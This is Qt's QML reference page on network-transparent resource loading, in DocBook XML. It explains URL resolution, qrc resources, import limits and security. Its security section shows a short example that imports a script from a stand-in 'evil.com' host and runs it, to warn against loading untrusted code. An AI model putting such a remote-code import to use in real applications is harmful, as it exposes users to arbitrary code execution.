<?xml version="1.0" encoding="UTF-8"?>
<db:article xmlns:db="http://docbook.org/ns/docbook" xmlns:xlink="http://www.w3.org/1999/xlink" version="5.2" xml:lang="en">
<db:info>
<db:title>Resource Loading and Network Transparency</db:title>
<db:productname>QtQml</db:productname>
<db:edition>Qt 5.8.0 Reference Documentation</db:edition>
<db:titleabbrev>Qt QML Reference Documentation</db:titleabbrev>
<db:abstract>
<db:para>about loading files and resources across a network.</db:para>
</db:abstract>
<db:pubdate>2025-06-29</db:pubdate>
<db:date>2025-06-29</db:date>
<db:authorgroup>
<db:author>
<db:orgname class="corporation">The Qt Company Ltd.</db:orgname>
</db:author>
</db:authorgroup>
</db:info>
<db:para>QML supports network transparency by using URLs (rather than file names) for all references from a QML document to other content. This means that anywhere a URL source is expected, QML can handle remote resources as well as local ones, for example in the following image source:</db:para>
<db:programlisting language="qml">Image {
    source: &quot;http://www.example.com/images/logo.png&quot;
}
</db:programlisting>
<db:para>Since a <db:emphasis>relative</db:emphasis> URL is the same as a relative file, development of QML on regular file systems remains simple:</db:para>
<db:programlisting language="qml">Image {
    source: &quot;images/logo.png&quot;
}
</db:programlisting>
<db:para>Network transparency is supported throughout QML, for example:</db:para>
<db:itemizedlist>
<db:listitem>
<db:para>Fonts - the source property of <db:link xlink:href="qml-qtquick-fontloader.xml">FontLoader</db:link> is a URL</db:para>
</db:listitem>
<db:listitem>
<db:para>WebViews - the url property of <db:link xlink:href="qml-qtwebview-webview.xml">WebView</db:link> (obviously!)</db:para>
</db:listitem>
</db:itemizedlist>
<db:para>Even QML types themselves can be on the network - if the <db:link xlink:href="qtquick-qmlscene.xml">Prototyping with qmlscene</db:link> is used to load <db:code>http://example.com/mystuff/Hello.qml</db:code> and that content refers to a type &quot;World&quot;, the engine will load <db:code>http://example.com/mystuff/qmldir</db:code> and resolve the type just as it would for a local file. For example if the qmldir file contains the line &quot;World World.qml&quot;, it will load <db:code>http://example.com/mystuff/World.qml</db:code> Any other resources that <db:code>Hello.qml</db:code> referred to, usually by a relative URL, would similarly be loaded from the network.</db:para>
<db:section xml:id="relative-vs-absolute-urls">
<db:title>Relative vs. Absolute URLs</db:title>
<db:para>Whenever an object has a property of type URL (<db:link xlink:href="qurl.xml">QUrl</db:link>), assigning a string to that property will actually assign an absolute URL - by resolving the string against the URL of the document where the string is used.</db:para>
<db:para>For example, consider this content in <db:code>http://example.com/mystuff/test.qml</db:code>:</db:para>
<db:programlisting language="qml">Image {
    source: &quot;images/logo.png&quot;
}
</db:programlisting>
<db:para>The <db:link xlink:href="qml-qtquick-image.xml">Image</db:link> source property will be assigned <db:code>http://example.com/mystuff/images/logo.png</db:code>, but while the QML is being developed, in say <db:code>C:\User\Fred\Documents\MyStuff\test.qml</db:code>, it will be assigned <db:code>C:\User\Fred\Documents\MyStuff\images\logo.png</db:code>.</db:para>
<db:para>If the string assigned to a URL is already an absolute URL, then &quot;resolving&quot; does not change it and the URL is assigned directly.</db:para>
</db:section>
<db:section xml:id="qrc-resources">
<db:title>QRC Resources</db:title>
<db:para>One of the URL schemes built into Qt is the &quot;qrc&quot; scheme. This allows content to be compiled into the executable using <db:link xlink:href="resources.xml">The Qt Resource System</db:link>. Using this, an executable can reference QML content that is compiled into the executable:</db:para>
<db:programlisting language="cpp">QQuickView *view = new QQuickView;
view-&gt;setUrl(QUrl(&quot;qrc:/dial.qml&quot;));
</db:programlisting>
<db:para>The content itself can then use relative URLs, and so be transparently unaware that the content is compiled into the executable.</db:para>
</db:section>
<db:section xml:id="limitations">
<db:title>Limitations</db:title>
<db:para>The import statement is only network transparent if it has an &quot;as&quot; clause.</db:para>
<db:para>More specifically:</db:para>
<db:itemizedlist>
<db:listitem>
<db:para>import &quot;dir&quot; only works on local file systems</db:para>
</db:listitem>
<db:listitem>
<db:para>import libraryUri only works on local file systems</db:para>
</db:listitem>
<db:listitem>
<db:para>import &quot;dir&quot; as D works network transparently</db:para>
</db:listitem>
<db:listitem>
<db:para>import libraryUrl as U works network transparently</db:para>
</db:listitem>
</db:itemizedlist>
</db:section>
<db:section xml:id="implications-for-application-security">
<db:title>Implications for Application Security</db:title>
<db:para>The QML security model is that QML content is a chain of trusted content: the user installs QML content that they trust in the same way as they install native Qt applications, or programs written with runtimes such as Python and Perl. That trust is establish by any of a number of mechanisms, including the availability of package signing on some platforms.</db:para>
<db:para>In order to preserve the trust of users, QML application developers should not load and execute arbitrary JavaScript or QML resources. For example, consider the QML code below:</db:para>
<db:programlisting language="qml">import QtQuick 2.0
import &quot;http://evil.com/evil.js&quot; as Evil

Component {
    onLoaded: Evil.doEvil()
}
</db:programlisting>
<db:para>This is equivalent to downloading and executing &quot;http://evil.com/evil.exe&quot;. <db:emphasis role="bold">The QML engine will not prevent particular resources from being loaded</db:emphasis>. Unlike JavaScript code that is run within a web browser, a QML application can load remote or local filesystem resources in the same way as any other native applications, so application developers must be careful in loading and executing any content.</db:para>
<db:para>As with any application accessing other content beyond its control, a QML application should perform appropriate checks on any untrusted data it loads. <db:emphasis role="bold">Do not, for example, use import, <db:link xlink:href="qml-qtquick-loader.xml">Loader</db:link> or <db:link xlink:href="qtqml-javascript-qmlglobalobject.xml#xmlhttprequest">XMLHttpRequest</db:link> to load any untrusted code or content.</db:emphasis></db:para>
</db:section>
</db:article>
